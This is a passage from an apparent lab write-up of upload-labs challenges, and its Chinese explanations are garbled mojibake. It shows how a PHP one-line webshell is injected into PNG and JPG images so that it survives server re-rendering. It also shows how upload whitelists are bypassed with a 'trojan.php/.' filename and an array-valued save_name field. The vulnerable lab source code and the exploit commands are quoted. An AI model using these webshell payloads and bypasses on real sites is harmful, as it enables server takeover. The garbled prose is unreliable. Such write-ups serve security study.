    >ËÑöÊú¨</a>Êù•ËøõË°å‰∏ÄÂè•ËØùÊú®È©¨ÁöÑËæìÂÖ• <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python2 poc_png.py -p <span class="s1">&#39;&lt;?php @eval($_POST[&#34;a&#34;]);?&gt;&#39;</span> -o png_trojan.png png_trojan.png
</span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-05-01_22-42-09_screenshot.png" width="700px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p>Â∞ùËØï‰∏ä‰º† <!-- raw HTML omitted --></p>
<p>Êü•Áúã‰∫åÊ¨°Ê∏≤ÊüìÂêéÁöÑÂõæÁâáÔºåÂèëÁé∞‰∏ÄÂè•ËØùÊú®È©¨ÊèíÂÖ•ÊàêÂäüÔºåËöÅÂâëËøûÊé•ÊàêÂäü <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-05-01_22-41-51_screenshot.png" width="700px"/>
</figure>
 <!-- raw HTML omitted --></p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>ÂÜôÂÖ•IDATÊï∞ÊçÆÂùó</p>
<p>Âà©Áî®ËÑöÊú¨Ôºå <!-- raw HTML omitted --></p>
<p>‰∏ãËΩΩ‰∫åÊ¨°Ê∏≤Êüì‰πãÂêéÁöÑÂõæÁâáÔºåÊ£ÄÊü•‰∏ÄÂè•ËØùÊú®È©¨ <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-05-01_22-52-43_screenshot.png" width="700px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p>shellÂà©Áî®ÊàêÂäü <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-05-01_22-58-39_screenshot.png" width="700px"/>
</figure>
 <!-- raw HTML omitted --></p>
</li>
</ul>
<h4 id="jpg">JPG</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">((</span><span class="nv">$fileext</span> <span class="o">==</span> <span class="s2">&#34;jpg&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$filetype</span><span class="o">==</span><span class="s2">&#34;image/jpeg&#34;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmpname</span><span class="p">,</span> <span class="nv">$upload_file</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">                     <span class="c1">//‰ΩøÁî®‰∏ä‰º†ÁöÑÂõæÁâáÁîüÊàêÊñ∞ÁöÑÂõæÁâá
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nv">$im</span> <span class="o">=</span> <span class="nx">imagecreatefromjpeg</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="k">if</span><span class="p">(</span><span class="nv">$im</span> <span class="o">==</span> <span class="k">false</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="c1">//ÁªôÊñ∞ÂõæÁâáÊåáÂÆöÊñá‰ª∂Âêç
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                        <span class="nx">srand</span><span class="p">(</span><span class="nx">time</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$newfilename</span> <span class="o">=</span> <span class="nx">strval</span><span class="p">(</span><span class="nx">rand</span><span class="p">())</span><span class="o">.</span><span class="s2">&#34;.jpg&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                        <span class="c1">//ÊòæÁ§∫‰∫åÊ¨°Ê∏≤ÊüìÂêéÁöÑÂõæÁâáÔºà‰ΩøÁî®Áî®Êà∑‰∏ä‰º†ÂõæÁâáÁîüÊàêÁöÑÊñ∞ÂõæÁâáÔºâ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                        <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$newfilename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                        <span class="nx">imagejpeg</span><span class="p">(</span><span class="nv">$im</span><span class="p">,</span><span class="nv">$img_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                        <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span></code></pre></div><p>Êàë‰ª¨È¶ñÂÖà‰∏ä‰º†‰∏ÄÂº†ÂõæÁâá <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/1603669426842.jpg" width="400px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p>ÁÑ∂Âêé‰∏ãËΩΩ‰∫åÊ¨°Ê∏≤Êüì‰πãÂêéÁöÑÂõæÁâáÔºåÁî®ËÑöÊú¨Ê≥®ÂÖ•php payloadÔºàÂèØ‰ª•Êîπ‰∏Ä‰∏ãÊ≥®ÂÖ•ÁöÑpayloadÔºâÔºö <a class="link" href="https://github.com/BlackFan/jpg_payload"  target="_blank" rel="noopener"
    >BlackFan / <!-- raw HTML omitted -->
jpg_payload</a>  <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">php php jpg_payload.php <span class="o">[</span>uploaded_jpg_image<span class="o">]</span>
</span></span></code></pre></div><p>ÁÑ∂ÂêéÊàë‰ª¨Ê£ÄÊü•payloadÊòØÂê¶Ê≥®ÂÖ•ÊàêÂäü <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-05-03_11-59-57_screenshot.png" width="700px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p>ÂÜçÊ¨°‰∏ä‰º†Ôºå‰∏ãËΩΩ‰∫åÊ¨°Ê∏≤ÊüìÂêéÁöÑÂõæÁâáÊü•Áúã <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/payload_second.jpg" width="400px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-05-03_12-00-33_screenshot.png" width="700px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p><!-- raw HTML omitted -->  <!-- raw HTML omitted -->
ÊúÄÂêéÂ∞ùËØïËß£ÊûêÂíå‰ΩøÁî®ÔºåÊàêÂäü <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-05-03_11-55-45_screenshot.png" width="700px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p>Â∞ùËØï‰∫ÜÂæàÂ§ö‰∏çÂêåÁöÑÂõæÁâáÔºåÊÑüËßâÂ∞±ÂÉèÂõΩÂÖâÂ∏àÂÇÖÊÄªÁªìÁöÑÈÇ£Ê†∑ÔºåÂõæÁâáË∂äÂ§ßÔºåpayloadË∂äÂ∞èË∂äÂÆπÊòìÊàêÂäüÔºåÂõ†‰∏∫‰πãÂâç‰∏ä‰º†‰∫ÜÂæàÂ§öÂ∞èÁöÑÂõæÁâáÔºå‰∏ÄÂè•ËØùÊú®È©¨ÈÉΩË¢´Êà™Êñ≠‰∫ÜÔºåÁåúÊµãÂèØËÉΩÊòØÂõ†‰∏∫ÂõæÁâáÂ§™Â∞èÔºåÂêåÊó∂‰∏ÄÂè•ËØùÊú®È©¨Â§™Èïø‰∫ÜÂç†Áî®ÂÖ≥ÈîÆÁöÑÈÉ®ÂàÜÊâÄ‰ª•Ë¢´ÊõøÊç¢‰∫Ü <!-- raw HTML omitted --></p>
<ol>
<li>Â§ßÂõæÁâá <!-- raw HTML omitted --></li>
<li>Áü≠payload <!-- raw HTML omitted --></li>
<li>ÂÖà‰∏ä‰º†‰∫åÊ¨°Ê∏≤Êüì‰πãÂêéÔºåÂÜçÊâßË°åËÑöÊú¨ÔºåÂÜç‰∏ä‰º† <!-- raw HTML omitted --></li>
</ol>
<h3 id="move-uploaded-file-ÁªïËøá">move_uploaded_file ÁªïËøá</h3>
<p>Êàë‰ª¨Áúã‰∏Ä‰∏ãÊ∫êÁ†ÅÂÖà <!-- raw HTML omitted --></p>
<p>ÂèëÁé∞ÊòØ‰∏Ä‰∏™ÁôΩÂêçÂçïÔºåÈÇ£‰πàËÇØÂÆöÂèàÈúÄË¶ÅÂà©Áî®‰∏Ä‰∫õÊúâÊºèÊ¥ûÁöÑÊñπÊ≥ïÊàñËÄÖÊìç‰ΩúÁ≥ªÁªüÁöÑÁâπÊÆäÊú∫Âà∂‰∫Ü <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$deny_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span><span class="s2">&#34;php5&#34;</span><span class="p">,</span><span class="s2">&#34;php4&#34;</span><span class="p">,</span><span class="s2">&#34;php3&#34;</span><span class="p">,</span><span class="s2">&#34;php2&#34;</span><span class="p">,</span><span class="s2">&#34;html&#34;</span><span class="p">,</span><span class="s2">&#34;htm&#34;</span><span class="p">,</span><span class="s2">&#34;phtml&#34;</span><span class="p">,</span><span class="s2">&#34;pht&#34;</span><span class="p">,</span><span class="s2">&#34;jsp&#34;</span><span class="p">,</span><span class="s2">&#34;jspa&#34;</span><span class="p">,</span><span class="s2">&#34;jspx&#34;</span><span class="p">,</span><span class="s2">&#34;jsw&#34;</span><span class="p">,</span><span class="s2">&#34;jsv&#34;</span><span class="p">,</span><span class="s2">&#34;jspf&#34;</span><span class="p">,</span><span class="s2">&#34;jtml&#34;</span><span class="p">,</span><span class="s2">&#34;asp&#34;</span><span class="p">,</span><span class="s2">&#34;aspx&#34;</span><span class="p">,</span><span class="s2">&#34;asa&#34;</span><span class="p">,</span><span class="s2">&#34;asax&#34;</span><span class="p">,</span><span class="s2">&#34;ascx&#34;</span><span class="p">,</span><span class="s2">&#34;ashx&#34;</span><span class="p">,</span><span class="s2">&#34;asmx&#34;</span><span class="p">,</span><span class="s2">&#34;cer&#34;</span><span class="p">,</span><span class="s2">&#34;swf&#34;</span><span class="p">,</span><span class="s2">&#34;htaccess&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span> <span class="nv">$deny_ext</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span><span class="nv">$file_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;error();&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></div><p>ËøôÈáåÁöÑÊºèÊ¥ûÂú®<a class="link" href="https://www.smi1e.top/2019/02/07/upload-labs-20%E5%85%B3%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/#Pass-09-%E7%A9%BA%E6%A0%BC-%E7%BB%95%E8%BF%87"  target="_blank" rel="noopener"
    >SmileÂ∏àÂÇÖÁöÑÁ¨îËÆ∞</a>‰∏≠ÊúâÊèêÂà∞ÔºåÂç≥ <code>move_uploaded_file</code> ‰ºöÂøΩÁï•/. <!-- raw HTML omitted --></p>
<p>ÈÇ£‰πàÊàë‰ª¨ÈÄöËøáÊûÑÈÄ†Êñá‰ª∂Âêç‰∏∫ <code>trojan.php/.</code> Âç≥ÂèØÁªïËøáÁôΩÂêçÂçïÔºåÂêåÊó∂‰ΩøwebshellË¢´Ê≠£Â∏∏Ëß£Êûê <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-05-03_12-19-13_screenshot.png" width="700px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p>ËöÅÂâëËøûÊé•ÊàêÂäü <!-- raw HTML omitted --></p>
<h3 id="‰ª£Á†ÅÂÆ°ËÆ°">‰ª£Á†ÅÂÆ°ËÆ°</h3>
<p>Âõ†‰∏∫ÊòØ‰ª£Á†ÅÂÆ°ËÆ°ÔºåÊàë‰ª¨Áõ¥Êé•Êù•Áúã‰ª£Á†Å <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//Ê£ÄÊü•MIME
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$allow_type</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;image/jpeg&#39;</span><span class="p">,</span><span class="s1">&#39;image/png&#39;</span><span class="p">,</span><span class="s1">&#39;image/gif&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">],</span><span class="nv">$allow_type</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;Á¶ÅÊ≠¢‰∏ä‰º†ËØ•Á±ªÂûãÊñá‰ª∂!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//Ê£ÄÊü•Êñá‰ª∂Âêç
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file</span> <span class="o">=</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save_name&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$file</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">end</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$allow_suffix</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;jpg&#39;</span><span class="p">,</span><span class="s1">&#39;png&#39;</span><span class="p">,</span><span class="s1">&#39;gif&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="nv">$allow_suffix</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;Á¶ÅÊ≠¢‰∏ä‰º†ËØ•ÂêéÁºÄÊñá‰ª∂!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">reset</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;.&#39;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="nx">count</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span><span class="nv">$file_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;Êñá‰ª∂‰∏ä‰º†ÊàêÂäüÔºÅ&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;Êñá‰ª∂‰∏ä‰º†Â§±Ë¥•ÔºÅ&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;ËØ∑ÈÄâÊã©Ë¶Å‰∏ä‰º†ÁöÑÊñá‰ª∂ÔºÅ&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Êàë‰ª¨Êé•ÁùÄ‰∏ÄÂùóÂùóÊù•ÁúãÊ∫êÁ†Å‰∏≠ÁöÑÂÆ°Ê†∏Êú∫Âà∂‰ª•ÂèäÊàë‰ª¨ÂØπÂ∫îÁöÑÁªïËøá <!-- raw HTML omitted --></p>
<p>Ê£ÄÊü• <code>MIME</code>,Âõ†Ê≠§Êàë‰ª¨ÈúÄË¶ÅÂú®Burp‰∏≠‰øÆÊîπ <code>MIME</code> Á±ªÂûã <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$allow_type</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;image/jpeg&#39;</span><span class="p">,</span><span class="s1">&#39;image/png&#39;</span><span class="p">,</span><span class="s1">&#39;image/gif&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">],</span><span class="nv">$allow_type</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;Á¶ÅÊ≠¢‰∏ä‰º†ËØ•Á±ªÂûãÊñá‰ª∂!&#34;</span><span class="p">;</span>
</span></span></code></pre></div><p>Ê£ÄÊü•Êàë‰ª¨Êèê‰∫§ÁöÑ <code>save_name</code> Â≠óÁ¨¶‰∏≤ÊòØÂê¶‰∏∫Á©∫ÔºåÊúâÂÜÖÂÆπÁöÑËØù‰ΩøÁî®Êàë‰ª¨Ëá™ÂÆö‰πâÁöÑÊñá‰ª∂‰øùÂ≠òÂêçÔºåÊé•ÁùÄÊ£ÄÊü•ÊòØÂê¶‰∏∫Êï∞ÁªÑÔºåÂ¶ÇÊûú‰∏çÊòØÁöÑËØùÂ∞±Ë¶Å‰ΩøÁî® <code>explode()</code> ÊñπÊ≥ïÂ∞ÜÂÜÖÂÆπÁî® <code>‚Äò.‚Äô</code> ÂàÜÈöî‰∏∫Êï∞ÁªÑÔºàÊÑüËßâÂíåÂÖ∂‰ªñËØ≠Ë®Ä‰∏≠ÁöÑ <code>split()</code> ÊñπÊ≥ïÂæàÂÉèÔºâ <!-- raw HTML omitted --></p>
<dl>
<dt>explode()</dt>
<dd><ul>
<li>explode(string $separator, string $string, int $limit = PHP_INT_MAX): array <!-- raw HTML omitted --></li>
<li>Returns an array of strings created by splitting the string parameter on boundaries formed by the separator. <!-- raw HTML omitted --></li>
</ul>
</dd>
</dl>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save_name&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Êé•ÁùÄÂèñÂá∫Êï∞ÁªÑÊúÄÂêé‰∏Ä‰∏™ÂÖÉÁ¥†ËøõË°åÂêéÁºÄÂêçÊ†°È™å <!-- raw HTML omitted --></p>
<dl>
<dt>end()</dt>
<dd><ul>
<li>end(array|object &amp;$array): mixed <!-- raw HTML omitted --></li>
<li>Returns the value of the last element or false for empty array. <!-- raw HTML omitted --></li>
</ul>
</dd>
</dl>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$ext</span> <span class="o">=</span> <span class="nx">end</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">       <span class="nv">$allow_suffix</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;jpg&#39;</span><span class="p">,</span><span class="s1">&#39;png&#39;</span><span class="p">,</span><span class="s1">&#39;gif&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="nv">$allow_suffix</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">           <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;Á¶ÅÊ≠¢‰∏ä‰º†ËØ•ÂêéÁºÄÊñá‰ª∂!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">       <span class="p">}</span>
</span></span></code></pre></div><p>Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáÂú® <code>save_name</code> Ëøô‰∏™ÂèòÈáèÂ§Ñ‰º†ÂÖ•‰∏Ä‰∏™Êï∞ÁªÑÔºå‰ΩøÊúÄÂêé‰∏Ä‰∏™ÂÖÉÁ¥†‰∏∫ÁôΩÂêçÂçïÁöÑÂõæÁâáÊ†ºÂºèÔºåÂÜçÊÉ≥ÂäûÊ≥ïÂú®ÊúÄÂêéÁöÑÂ≠òÂÇ®ÁöÑÊó∂ÂÄôÔºåËÆ©ÊúÄÂêé‰∏Ä‰∏™ÂÖÉÁ¥†ÁöÑÂÜÖÂÆπÊó†ÊïàÂ∞±Ë°å‰∫Ü <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="o">=&gt;</span><span class="s1">&#39;shell.php/&#39;</span><span class="p">,</span> <span class="mi">2</span><span class="o">=&gt;</span><span class="s1">&#39;png&#39;</span><span class="p">]</span>
</span></span></code></pre></div><dl>
<dt>reset()</dt>
<dd><ul>
<li>reset(array|object &amp;$array): mixed <!-- raw HTML omitted --></li>
<li>Returns the value of the first array element, or false if the array is empty. <!-- raw HTML omitted --></li>
</ul>
</dd>
</dl>
<p>ÊúÄÂêéÂõ†‰∏∫ËøôÈáå‰ºöÊãºÊé•‰∏Ä‰∏™ <code>'.'</code> ÔºåÂõ†Ê≠§‰∏é‰πãÂâçÁöÑ <code>'/'</code> ÊûÑÊàêÊàë‰ª¨‰∏ä‰∏ÄÂÖ≥ÊèêÂà∞ÁöÑ <code>move_uploaded_file</code> ÁöÑÊºèÊ¥ûÔºåÂç≥ <code>/.</code> Êú´Â∞æÁöÑÂÜÖÂÆπ‰ºöË¢´ÂøΩÁï•ÔºåÂç≥ÂèØÂÆåÊàêÁªïËøáÔºå‰∏ä‰º†ÊàêÂäü <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">reset</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;.&#39;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="nx">count</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
